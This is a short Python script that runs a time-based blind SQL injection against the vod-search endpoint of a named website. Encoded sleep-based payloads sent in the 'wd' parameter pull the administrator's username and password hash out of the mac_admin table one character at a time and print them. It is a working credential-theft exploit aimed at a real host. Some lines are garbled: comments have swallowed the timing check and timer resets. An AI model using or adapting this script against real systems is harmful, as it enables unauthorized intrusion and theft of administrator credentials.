
import time,requests
dict = "1234567890qwertyuiopasdfghjklzxcvbnm_{}QWERTYUIOPASDFGHJKLZXCVBNM,@.?"
UserName=''
UserPass=''
UserName_length=0
url='https://www.dudou.xyz'
url = url + r'/index.php?m=vod-search'
def main():
    global UserName
    global url
    global startTime
    for i in range(30):
        startTime = time.time()
        sql = "))||if((select%0bascii(length((select(admin_name)``from(mac_admin))))={}),(`sleep`(3)),0)#%25%35%63".format(
            ord(str(i)))
        data = {'wd': sql}
        response = requests.post(url, data=data)  # 发送请求         if time.time() - startTime > 3:
        UserName_length = i
        print(UserName_length)
        break
    for num in range(1, UserName_length + 1):
        for i in dict:  # 遍历取出字符             startTime = time.time()
            sql = "))||if((select%0bascii(substr((select(admin_name)``from(mac_admin)),{},1))={}),(`sleep`(3)),0)#%25%35%63".format(
                str(num), ord(i))
            data = {'wd': sql}
            response = requests.post(url, data=data)  # 发送请求             print data
            if time.time() - startTime > 3:
                UserName += i
                break
    global UserPass
    for num in range(33):
        for i in dict:  # 遍历取出字符             startTime = time.time()
            sql = "))||if((select%0bascii(substr((select(admin_pwd)``from(mac_admin)),{},1))={}),(`sleep`(3)),0)#%25%35%63".format(
                str(num), ord(i))
            data = {'wd': sql}
            response = requests.post(url, data=data)  # 发送请求             print data
            if time.time() - startTime > 3:
                UserPass += i
                break
    print('username:'+UserName,'password:'+UserPass)
if __name__ == '__main__':
    main()